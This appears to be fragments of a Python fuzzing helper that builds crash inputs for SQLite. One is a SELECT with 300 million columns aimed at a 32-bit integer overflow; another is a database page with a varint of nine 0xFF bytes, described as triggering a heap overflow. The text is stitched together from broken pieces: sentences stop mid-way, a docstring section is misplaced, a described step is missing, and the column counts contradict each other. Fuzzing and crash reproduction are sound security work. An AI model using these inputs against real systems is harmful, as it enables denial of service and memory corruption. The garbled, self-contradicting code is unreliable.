    of the allocated block and invokes `sqlite3_free` on an out‑of‑bounds
    address, triggering a heap‑overflow / use‑after‑free condition that
    can be caught by ASAN or a canary check.

    SQLite build, but using several hundred thousand columns is enough
    to exceed the 2 GB limit of a 32‑bit signed size calculation on most
    platforms.

    -------
    bytes
        UTF‑8 encoded SQL statement.

    # Number of columns – choose a value that forces a 32‑bit integer overflow
    # when multiplied by sizeof(char*).  For 8‑byte pointers the overflow
    # occurs near 268 435 456 columns (2 GB / 8).  Use a safe margin.
    COL_COUNT = 300_000_000   # 300 M columns ≈ 2.4 GB for 8‑byte pointers

    # Build the column list lazily to avoid holding the whole string in memory
    # before encoding.  itertools.chain creates a single iterator.
    cols = itertools.chain.from_iterable(
        (f"c{i}", ", ") for i in range(1, COL_COUNT + 1)
    )
    # Drop the trailing comma‑space and add the FROM clause.
    sql_parts = ["SELECT "]
    sql_parts.extend(cols)
    # Remove the last ", " added by the generator.
    if sql_parts[-1].endswith(", "):
        sql_parts[-1] = sql_parts[-1][:-2]
    sql_parts.append(" FROM t;")

    # Join and encode.  The join is performed in one step to keep the
    # memory footprint reasonable for the fuzzer harness.

    whose first page contains a leaf‑table b‑tree cell whose payload‑length
    varint is nine 0xFF bytes.  When SQLite parses that cell it computes a
    payload size that overflows, triggering the heap‑overflow condition
    detectable by ASAN / canary in the `sqlite3_fuzz` harness.
